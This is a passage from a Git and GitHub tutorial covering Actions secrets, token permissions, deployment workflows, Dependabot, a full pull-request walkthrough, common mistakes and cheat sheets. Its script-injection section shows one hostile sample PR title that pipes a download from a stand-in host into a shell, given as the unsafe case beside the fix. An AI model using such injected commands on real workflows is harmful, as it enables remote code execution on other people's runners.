4. Optionally tick **Require branches to be up to date before merging**, which makes sure the checks ran against the latest `main`.

From now on, a failing or pending check disables the merge button. The bottom of the pull request lists every check with a pass, fail, or pending mark and a **Details** link to its log. From the terminal:

```bash
$ gh pr checks           # the same list: each check, its status, and a link to its log
$ gh pr checks --watch   # wait until every check finishes
```

Fix the problem locally, commit, and push. The checks rerun on the new commit automatically.

**Notes:**
- A required check that never reports shows as **Expected — Waiting for status to be reported** and blocks the merge forever. It usually means the job was renamed, or the workflow's `on:` filter does not match pull requests. Rename the required check in the ruleset to match.
- Give jobs short, stable names. Renaming a job breaks the ruleset that requires it.

---

## 27. Secrets, Permissions, and Workflow Security

Workflows run code with access to your repository and your secrets, so a few rules matter from the very first workflow.

### Storing secrets

Add secrets under **Settings → Secrets and variables → Actions**, or from the terminal:

```bash
$ gh secret set LLM_API_KEY          # prompts for the value, never echoed or logged
$ gh secret list
```

Use them through `env:`, never by pasting values into workflow files:

```yaml
- name: Call the API
  env:
    LLM_API_KEY: ${{ secrets.LLM_API_KEY }}
  run: uv run python scripts/smoke_test.py
```

GitHub masks secret values in logs, printing `***` instead. Non-sensitive configuration, such as a region name, belongs in **variables** (`${{ vars.REGION }}`), which are not masked.

### The workflow token and least privilege

Every run gets an automatic, short-lived token, `GITHUB_TOKEN` (also available as `github.token`), which actions use to talk to GitHub. Limit what it can do with a `permissions:` block, at the top of the workflow or per job, granting only what is needed:

| Need | Permission |
| :--- | :--- |
| Read the code (most CI) | `contents: read` |
| Create releases or push tags | `contents: write` |
| Comment on PRs | `pull-requests: write` |
| Publish container images to GitHub's registry | `packages: write` |
| Authenticate to a cloud provider with OIDC | `id-token: write` |

### Pull requests from forks

A `pull_request` workflow triggered from a **fork** runs without access to your secrets and with a read-only token. That is deliberate — otherwise anyone could open a PR that prints your secrets. Avoid the `pull_request_target` trigger unless you fully understand it, because it runs with your secrets while handling code from strangers; `actions/checkout` from v7 refuses to check out fork code under that trigger unless explicitly told to.

### Script injection

Text from an issue title, PR title, branch name, or commit message is user input. Interpolating it straight into a shell command lets an attacker run their own commands on your runner:

```yaml
# Unsafe: a PR titled  "; curl evil.example | sh; #  runs that command
- run: echo "Thanks for ${{ github.event.pull_request.title }}"

# Safe: pass it through an environment variable
- env:
    PR_TITLE: ${{ github.event.pull_request.title }}
  run: echo "Thanks for $PR_TITLE"
```

### Pinning actions

`uses: owner/action@v7` points at a tag, and the owner of that action can move the tag to different code at any time. For third-party actions, pin the full commit SHA, with the version as a comment so Dependabot can still update it:

```yaml
uses: astral-sh/setup-uv@68559e99cc807c1eb7e9238fd43a15bba460eec2 # v10.3.3
```

Actions published by GitHub itself (`actions/*`) are commonly referenced by major tag, as in `actions/checkout@v7`. Security-conscious organisations pin everything to SHAs, and GitHub lets administrators enforce that as a policy.

### Environments for deployments

An **environment** (**Settings → Environments**), such as `production`, can hold its own secrets, restrict which branches may deploy to it, and require a named person to approve each deployment. Jobs opt in with `environment: production` (Section 28).

**Notes:**
- Never `echo` a secret or write it to a file that gets uploaded as an artifact. Masking only covers the exact value as it appears in logs.
- For deploying to AWS, GCP, or Azure, prefer **OIDC** (`id-token: write`) over long-lived cloud keys stored as secrets. The cloud provider trusts GitHub's identity token directly, so there is no key to leak.
- Each third-party action you add is code you are trusting with your repository. Prefer well-known, widely used actions.

---

## 28. Continuous Deployment and Releases

Continuous deployment means every change merged into `main` is shipped automatically once it passes the checks. The usual shape is a `deploy` job that **needs** the `test` job, runs **only** for pushes to `main` (not for pull requests), and uses a protected environment.

```yaml
name: CI and deploy

on:
  push:
    branches: [main]
  pull_request:

permissions:
  contents: read

jobs:
  test:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v7
        with:
          persist-credentials: false
      - uses: astral-sh/setup-uv@68559e99cc807c1eb7e9238fd43a15bba460eec2 # v10.3.3
      - run: uv sync --locked
      - run: uv run pytest

  deploy:
    needs: test
    if: github.event_name == 'push' && github.ref == 'refs/heads/main'
    runs-on: ubuntu-latest
    environment: production
    concurrency:
      group: production
      cancel-in-progress: false
    steps:
      - name: Trigger the deployment
        env:
          DEPLOY_HOOK_URL: ${{ secrets.DEPLOY_HOOK_URL }}
        run: curl --fail --silent --show-error -X POST "$DEPLOY_HOOK_URL"
```

| Line | Why |
| :--- | :--- |
| `needs: test` | the deploy waits for the tests and is skipped if they fail |
| `if: ...` | pull requests run the tests but never deploy |
| `environment: production` | uses the environment's secrets and any approval rules on it |
| `concurrency: group: production` | two merges in quick succession deploy one after the other, never at the same time |

Many hosting platforms (Render, Railway, Fly.io, and others) give you a **deploy hook** — a secret URL that starts a new deployment when called — which is exactly what the last step does. Container-based deployments instead build a Docker image in the workflow, push it to a registry, and tell the platform to run the new image. The Docker guide covers that pattern.

### Releases from tags

A second common pattern publishes a release whenever a version tag is pushed (Section 22):

```yaml
name: Release

on:
  push:
    tags: ["v*"]

permissions:
  contents: write

jobs:
  release:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v7
        with:
          persist-credentials: false
      - uses: astral-sh/setup-uv@68559e99cc807c1eb7e9238fd43a15bba460eec2 # v10.3.3
      - name: Build the package
        run: uv build
      - name: Create the GitHub release
        env:
          GH_TOKEN: ${{ github.token }}
          TAG: ${{ github.ref_name }}
        run: gh release create "$TAG" dist/* --repo "$GITHUB_REPOSITORY" --generate-notes
```

Releasing becomes two commands on your machine, and the workflow does the rest:

```bash
$ git tag -a v1.1.0 -m "Add batch scoring"
$ git push origin v1.1.0
```

**Notes:**
- **Continuous delivery** means every change on `main` is *ready* to deploy, with a human pressing the button. **Continuous deployment** means it deploys automatically. Required approvals on the `production` environment turn one into the other.
- Keep deployments reversible. If a release breaks, the fastest fix is usually `git revert` of the offending commit on `main`, which deploys the previous behaviour through the same pipeline.

---

## 29. Keeping Dependencies Current with Dependabot

**Dependabot** is GitHub's built-in bot that opens pull requests when your dependencies, including the actions in your workflows, have new versions or security fixes. CI then runs on each update PR, so you can see at a glance whether an update is safe to merge.

Create `.github/dependabot.yml`:

```yaml
version: 2
updates:
  - package-ecosystem: "github-actions"
    directory: "/"
    schedule:
      interval: "weekly"

  - package-ecosystem: "uv"
    directory: "/"
    schedule:
      interval: "weekly"
    groups:
      python-dependencies:
        patterns: ["*"]
```

| Part | Effect |
| :--- | :--- |
| `github-actions` | keeps `actions/checkout@v7` and SHA-pinned actions current, updating the version comment too |
| `uv` | updates `uv.lock` (use `pip` for projects with `requirements.txt`) |
| `groups:` | bundles all Python updates into one weekly PR instead of one PR per package |

Also turn on **Dependabot alerts** and **Dependabot security updates** in the repository's security settings, which flag and patch known vulnerabilities as soon as they are published rather than on the weekly schedule.

**Notes:**
- A dependency update with green CI is usually safe to merge, which is the real reason a good test suite pays off — it makes updates cheap.
- Update major versions deliberately. Read the release notes, because a new major version (`v6` to `v7`) may change defaults or remove inputs.

---

## 30. One Feature from Issue to Production

This section strings everything together into the sequence you will run, in some form, for almost every change in a team. The repository has CI from Section 25, a ruleset on `main` requiring one approval and the `test` check (Sections 21 and 26), and squash merging enabled.

**1. Start from an up-to-date main.**

```bash
$ git switch main
$ git pull
```

**2. Pick up the issue and create a branch for it.**

```bash
$ gh issue view 12                       # "Add a confidence threshold to score()"
$ git switch -c feature/12-threshold
```

**3. Work in small commits.** Write the code and its tests, run them locally, and commit as each piece works.

```bash
$ uv run pytest
$ git add -p
$ git commit -m "feat: add confidence threshold to score()"
$ git add tests/test_model.py
$ git commit -m "test: cover scores below the threshold"
```

**4. Push and open a draft pull request** so CI starts and teammates can see the direction early.

```bash
$ git push
$ gh pr create --draft --title "Add confidence threshold to score()" --body "Closes #12"
```

**5. CI fails.** The PR shows a red check. Read the failed step's log:

```bash
$ gh run view --log-failed          # log lines shortened to the ruff output
I001 [*] Import block is un-sorted or un-formatted
 --> tests/test_model.py:1:1
Found 1 error.
[*] 1 fixable with `--fix`.
```

Fix it locally, confirm, and push. The checks rerun on the new commit.

```bash
$ uv run ruff check --fix .
$ uv run ruff check . && uv run pytest
$ git commit -am "style: sort imports"
$ git push
```

**6. Ask for review.** Mark the PR ready and request a reviewer.

```bash
$ gh pr ready
$ gh pr edit --add-reviewer octo-reviewer
```

**7. Address the feedback.** The reviewer asks for the threshold to be configurable. Make the change as a new commit on the same branch.

```bash
$ git commit -am "feat: read threshold from SCORE_THRESHOLD"
$ git push
```

**8. Main moved, and now there is a conflict.** Another PR changed `src/model.py` and merged first. GitHub reports **This branch has conflicts that must be resolved**. Rebase onto the latest `main`, resolve (Section 14), test, and force-push your own branch safely.

```bash
$ git fetch
$ git rebase origin/main
CONFLICT (content): Merge conflict in src/model.py
# edit the file, remove the markers, keep both intentions
$ git add src/model.py
$ git rebase --continue
$ uv run pytest
$ git push --force-with-lease
```

**9. Approved and green: merge.** Squash and merge on GitHub, or from the terminal:

```bash
$ gh pr merge --squash --delete-branch
```

Issue #12 closes automatically, and the branch is deleted on GitHub.

**10. Deployment runs.** The push to `main` triggers the workflow from Section 28: tests run again on the merged code, then the `deploy` job ships it.

```bash
$ gh run watch
```

**11. Clean up locally.**

```bash
$ git switch main
$ git pull
$ git branch -D feature/12-threshold     # -D because squashing changed the commit hashes
```

**12. Later: cut a release.** When enough features have landed:

```bash
$ git tag -a v1.1.0 -m "Confidence threshold and batch scoring"
$ git push origin v1.1.0                 # the release workflow builds and publishes it
```

**Notes:**
- Steps 5, 7, and 8 are the ones beginners fear, and they are entirely normal. A pull request that went through failing CI, review changes, and a rebase is a typical pull request, not a troubled one.
- If something goes badly wrong mid-rebase, `git rebase --abort` returns you to step 7's state, and the reflog covers anything worse.

---

## 31. Useful Extras: cherry-pick, bisect, worktree

Three commands you will not use daily, but which save hours when the situation arises.

### cherry-pick: copy one commit to another branch

A fix landed on `main`, and it also needs to go onto the `release/1.x` branch without everything else from `main`.

```bash
$ git switch release/1.x
$ git cherry-pick -x 4f2a9c1       # -x notes the original commit in the message
$ git push
```

### bisect: find the commit that broke something

Tests pass on `v1.0.0` and fail on `main`, with fifty commits in between. `git bisect` binary-searches the history, checking out the midpoint each time, until it finds the first bad commit, in about six steps for fifty commits.

```bash
$ git bisect start
$ git bisect bad                    # the current commit is broken
$ git bisect good v1.0.0            # this tag was fine
$ git bisect run uv run pytest tests/test_model.py    # let a test decide each step
$ git bisect reset                  # return to where you started
```

`git bisect run` accepts any command that exits with 0 for "good" and non-zero for "bad", so a short script can automate the search for any reproducible problem.

### worktree: two branches checked out at once

A worktree is an additional working folder attached to the same repository, with a different branch checked out. You can fix an urgent bug in one folder while a half-finished feature stays untouched in another, with no stashing.

```bash
$ git worktree add ../sentiment-api-hotfix -b fix/urgent origin/main
$ cd ../sentiment-api-hotfix        # fix, commit, push from here
$ git worktree list
$ git worktree remove ../sentiment-api-hotfix
```

Worktrees are also how AI coding agents work on several tasks in parallel without interfering with each other — expect to see them more and more.

**Notes:**
- A branch can be checked out in only one worktree at a time. Git refuses to check it out in a second one.
- Cherry-picking creates a new commit with a new hash. Prefer merging when you want *all* of one branch's work, and cherry-pick only for individual commits.

---

## 32. Common Mistakes

**Committing secrets.** A key pushed to GitHub must be treated as public from that moment. Revoke and replace it first; cleaning history afterwards does not undo the exposure. Keep keys in an ignored `.env` from day one.

**Committing datasets, model weights, or a virtual environment.** They bloat every clone forever, even after deletion. Write the `.gitignore` before the first commit, and keep data and models in storage built for them (Section 23).

**Using `git push --force` on a shared branch.** It silently deletes other people's commits from GitHub. On your own branch use `--force-with-lease`; on shared branches, never force-push at all.

**Rebasing commits other people already have.** Rebasing creates new commits, and anyone who based work on the old ones ends up with duplicated history. Rebase only your own, unshared work.

**Working directly on `main`.** Every change on `main` skips review and CI. Create a branch for everything, even one-line fixes, and protect `main` with a ruleset so the habit is enforced.

**Letting branches live for weeks.** The longer a branch lives, the further `main` drifts and the worse the eventual conflict. Pull often, rebase onto `main` regularly, and keep PRs small.

**Running `git add .` without looking.** It stages everything, including debug files, notebooks full of outputs, and the `.env` you forgot to ignore. Run `git status` first, or use `git add -p`.

**Running `git reset --hard` with uncommitted work.** Uncommitted changes destroyed this way cannot be recovered by anything, not even the reflog. Stash or commit first.

**Reaching for `reset` to undo pushed commits.** Rewriting published history breaks everyone else's copy. Use `git revert`, which records the undo as a new commit.

**Leaving conflict markers in the code.** Markers are plain text, so in Markdown, config files, or a comment nothing fails to warn you. Search for markers before committing, and on Git 2.56+ stage with `git add --resolved`, which refuses while markers remain.

**Hand-editing a conflicted lockfile.** Resolve `pyproject.toml`, then regenerate `uv.lock` with `uv lock`. Hand-merged lockfiles are almost always subtly broken.

**Getting ours and theirs backwards during a rebase.** In a rebase, `HEAD` and `--ours` are the upstream branch, and `--theirs` is your own commit being replayed. Read the labels on the conflict markers rather than assuming.

**Mixing unrelated changes in one commit.** A commit that fixes a bug and reformats three files cannot be reverted without losing the formatting, and is hard to review. Stage selectively with `git add -p`.

**Writing messages that say nothing.** `fix`, `update`, and `changes` tell a future reader nothing. Say what the commit does, in the imperative: `Fix crash on empty input`.

**Creating the GitHub repository with a README when local commits already exist.** The first push is then rejected, because GitHub has a commit your branch lacks. Create the remote empty, or pull with rebase once before pushing (Section 6).

**Ignoring a failing CI run because "it works locally".** CI runs on a clean machine, which is exactly the point — the failure usually reveals a missing dependency, an untracked file, or a stale lockfile. Read the log; do not just rerun it.

**Interpolating untrusted text into workflow scripts.** `${{ github.event.pull_request.title }}` inside `run:` lets an attacker inject shell commands. Pass such values through `env:` instead.

**Giving workflows more permissions than they need.** Without a `permissions:` block, the token may get broad write access, depending on repository settings. Start every workflow with `contents: read` and grant more per job only where needed.

**Calling a paid LLM API in every CI run.** It is slow, costs money, and gives non-deterministic results that make checks flaky. Mock the client in unit tests and run real-model evaluations on a schedule.

---

## 33. Interview Quick-Fire

Short, high-frequency questions with the answers an interviewer expects.

**What is the difference between Git and GitHub?** Git is the version control tool that runs locally and records history. GitHub is a hosting service for Git repositories that adds collaboration features: pull requests, issues, permissions, and Actions.

**What are the working directory, staging area, and repository?** The working directory is your files; the staging area (index) is the draft of the next commit; the repository is the committed history in `.git`. `git add` moves changes into staging, and `git commit` records them.

**What is a commit?** A snapshot of the whole project plus metadata (author, date, message) and a pointer to its parent commit, identified by a hash.

**What is a branch?** A lightweight, movable pointer to a commit. Committing on a branch moves the pointer forward. Creating one is instant.

**What is HEAD?** A pointer to your current position, normally the checked-out branch. "Detached HEAD" means it points directly at a commit instead of a branch.

**`git fetch` vs `git pull`?** `fetch` downloads remote commits and updates remote-tracking branches without touching your work. `pull` is `fetch` followed by a merge or rebase into your current branch.

**Merge vs rebase?** Merge joins two histories with a merge commit and preserves exactly what happened. Rebase replays your commits on top of another branch, producing a linear history with new commit hashes. Rebase private work; merge (or squash-merge) shared work.

**What is the golden rule of rebasing?** Never rebase commits that others have already pulled, because it rewrites history they depend on.

**What is a fast-forward merge?** When the target branch has no new commits since the feature branched off, Git just moves the target pointer forward, and no merge commit is created.

**`git reset` vs `git revert`?** `reset` moves the branch pointer backwards, rewriting history; it is for local, unpushed work. `revert` adds a new commit that undoes an earlier one, so it is safe on shared branches.

**What do `--soft`, `--mixed`, and `--hard` do?** All three move the branch. `--soft` keeps the changes staged, `--mixed` keeps them unstaged, and `--hard` discards them from the working directory too.

**How do you resolve a merge conflict?** Open the conflicted files, choose the correct content between the markers, delete the markers, run the tests, stage the files with `git add`, and complete the merge with `git commit` (or `git rebase --continue`).

**`--force` vs `--force-with-lease`?** Both overwrite the remote branch. `--force-with-lease` refuses if the remote has commits you have not seen, so it cannot silently destroy a teammate's work.

**How do you recover a commit after a bad reset?** Find it in `git reflog` and `git reset --hard` to it, or create a branch at it.

**What is a pull request?** A GitHub feature for proposing that one branch be merged into another, with the diff, review comments, and automated checks in one place.

**Squash merge vs merge commit?** Squash merge condenses all of a PR's commits into one commit on `main`, giving a clean one-line-per-feature history. A merge commit keeps every branch commit plus a commit joining the histories.

**What is CI/CD?** Continuous integration automatically builds and tests every change before it merges. Continuous delivery keeps `main` always releasable; continuous deployment ships every merged change automatically.

**What are the parts of a GitHub Actions workflow?** Events trigger workflows; a workflow contains jobs that run in parallel on runners; each job runs steps, which are shell commands or reusable actions.

**How do you keep secrets out of a repository?** Ignore `.env` files, use a secret manager or GitHub Actions secrets for CI, and if a secret is ever committed, revoke and rotate it immediately.

**Why not store large datasets or model weights in Git?** Git keeps every version forever, so large binaries bloat every clone permanently. Use object storage, a model registry, DVC, or Git LFS.

---

## 34. Cheat Sheet

**Setup**

| Task | Command |
| :--- | :--- |
| Set your name and email | `git config --global user.name "..."`, `git config --global user.email "..."` |
| Default branch `main` | `git config --global init.defaultBranch main` |
| Rebase on pull | `git config --global pull.rebase true` |
| Push new branches without `-u` | `git config --global push.autoSetupRemote true` |
| Show the base version in conflicts | `git config --global merge.conflictStyle zdiff3` |
| Sign in to GitHub | `gh auth login` |
| Handy log alias | `git config --global alias.lg "log --oneline --graph --all"` |

**Starting**

| Task | Command |
| :--- | :--- |
| New repository | `git init` |
| Copy an existing one | `git clone <url>` |
| Create a GitHub repo from the current folder | `gh repo create <name> --private --source=. --push` |
| Connect a remote by hand | `git remote add origin <url>` then `git push -u origin main` |

**Daily loop**

| Task | Command |
| :--- | :--- |
| What changed? | `git status`, `git diff`, `git diff --staged` |
| Stage | `git add <file>`, `git add -p`, `git add .` |
| Commit | `git commit -m "message"` |
| Sync | `git pull`, then `git push` |
| History | `git log --oneline --graph --all` |
| Who changed this line? | `git blame <file>` |

**Branches**

| Task | Command |
| :--- | :--- |
| Create and switch | `git switch -c <branch>` |
| Switch | `git switch <branch>`, `git switch -` |
| List | `git branch`, `git branch -a` |
| Merge into current | `git merge <branch>` |
| Rebase onto latest main | `git fetch` then `git rebase origin/main` |
| Push a rebased branch | `git push --force-with-lease` |
| Delete local / remote | `git branch -d <branch>`, `git push origin --delete <branch>` |

**Conflicts**

| Task | Command |
| :--- | :--- |
| See what is conflicted | `git status` |
| Take one side of a file | `git checkout --ours <file>`, `git checkout --theirs <file>` |
| Mark resolved | `git add <file>` (or `git add --resolved` on Git 2.56+) |
| Finish | `git commit` (merge) or `git rebase --continue` (rebase) |
| Give up | `git merge --abort`, `git rebase --abort` |

**Undoing**

| Task | Command |
| :--- | :--- |
| Discard file edits ⚠️ | `git restore <file>` |
| Unstage | `git restore --staged <file>` |
| Fix the last commit | `git commit --amend` |
| Undo a pushed commit | `git revert <commit>` |
| Un-commit, keep changes | `git reset --soft HEAD~1` |
| Match GitHub exactly ⚠️ | `git reset --hard origin/main` |
| Shelve work | `git stash push -m "..."`, `git stash pop` |
| Find lost commits | `git reflog` |

**GitHub CLI**

| Task | Command |
| :--- | :--- |
| Open a PR | `gh pr create --fill` |
| Check out a PR | `gh pr checkout <number>` |
| See checks | `gh pr checks` |
| Merge | `gh pr merge --squash --delete-branch` |
| Watch CI | `gh run watch`, `gh run view --log-failed` |
| Set a secret | `gh secret set <NAME>` |
| Release | `gh release create v1.0.0 --generate-notes` |

**GitHub Actions**

| Piece | Location or syntax |
| :--- | :--- |
| Workflow files | `.github/workflows/*.yml` |
| Run on PRs and pushes to main | `on: { pull_request: {}, push: { branches: [main] } }` |
| Least-privilege token | `permissions: { contents: read }` |
| Check out code | `uses: actions/checkout@v7` |
| Install uv (caching is on by default) | `uses: astral-sh/setup-uv@<sha> # v10.3.3` |
| Install exactly the lockfile | `run: uv sync --locked` |
| Use a secret | `env: { KEY: "${{ secrets.KEY }}" }` |
| Run after another job | `needs: test` |
| Only on main | `if: github.ref == 'refs/heads/main'` |
| Dependency updates | `.github/dependabot.yml` |
